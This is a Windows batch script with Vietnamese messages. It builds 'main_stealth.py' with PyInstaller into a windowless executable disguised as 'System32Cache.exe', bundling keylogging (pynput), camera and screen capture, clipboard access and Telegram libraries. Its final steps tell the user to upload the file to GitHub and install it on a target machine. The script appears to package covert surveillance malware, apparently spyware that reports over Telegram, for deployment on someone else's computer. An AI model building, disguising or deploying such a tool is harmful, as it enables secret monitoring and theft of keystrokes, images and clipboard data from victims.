@echo off
chcp 65001 >nul
echo ========================================
echo BUILD FILE .EXE
echo ========================================
echo.

REM Kiểm tra Python
where python >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Khong tim thay Python!
    pause
    exit /b 1
)

echo [OK] Tim thay Python
python --version
echo.

REM Kiểm tra PyInstaller
echo [CHECK] Dang kiem tra PyInstaller...
python -c "import PyInstaller" >nul 2>&1
if errorlevel 1 (
    echo [INFO] PyInstaller chua duoc cai dat, dang cai dat...
    pip install pyinstaller
    if errorlevel 1 (
        echo [ERROR] Khong the cai dat PyInstaller!
        pause
        exit /b 1
    )
)
echo [OK] PyInstaller da san sang
echo.

REM Kiểm tra file main_stealth.py
if not exist "main_stealth.py" (
    echo [ERROR] Khong tim thay main_stealth.py!
    pause
    exit /b 1
)

echo [INFO] Dang build file .exe...
echo [INFO] Qua trinh nay co the mat 2-5 phut...
echo.

REM Xóa thư mục build và dist cũ
if exist "build" (
    echo [INFO] Dang xoa thu muc build cu...
    rmdir /s /q "build" >nul 2>&1
)
if exist "dist" (
    echo [INFO] Dang xoa thu muc dist cu...
    rmdir /s /q "dist" >nul 2>&1
)
if exist "main_stealth.spec" (
    del /f /q "main_stealth.spec" >nul 2>&1
)

REM Build .exe với PyInstaller
echo [BUILD] Dang build...
pyinstaller --onefile ^
    --noconsole ^
    --hidden-import=win32gui ^
    --hidden-import=win32con ^
    --hidden-import=telegram ^
    --hidden-import=telegram.ext ^
    --hidden-import=cv2 ^
    --hidden-import=numpy ^
    --hidden-import=PIL ^
    --hidden-import=pynput ^
    --hidden-import=psutil ^
    --hidden-import=pyperclip ^
    --hidden-import=pystray ^
    --name="System32Cache" ^
    --icon=NONE ^
    main_stealth.py

if errorlevel 1 (
    echo [ERROR] Build that bai!
    pause
    exit /b 1
)

REM Kiểm tra file .exe đã được tạo
if not exist "dist\System32Cache.exe" (
    echo [ERROR] Khong tim thay file .exe sau khi build!
    pause
    exit /b 1
)

echo.
echo [SUCCESS] Build thanh cong!
echo File .exe: dist\System32Cache.exe
echo.

REM Hiển thị kích thước file
for %%f in ("dist\System32Cache.exe") do (
    set /a size_mb=%%~zf/1024/1024
    echo Kich thuoc: %%~zf bytes (~!size_mb! MB)
)

echo.
echo ========================================
echo HOAN TAT!
echo ========================================
echo.
echo File .exe da duoc tao tai: dist\System32Cache.exe
echo.
echo Buoc tiep theo:
echo 1. Upload file dist\System32Cache.exe len GitHub
echo 2. Su dung INSTALL_EXE.bat de tai va cai dat tren may dich
echo.
pause

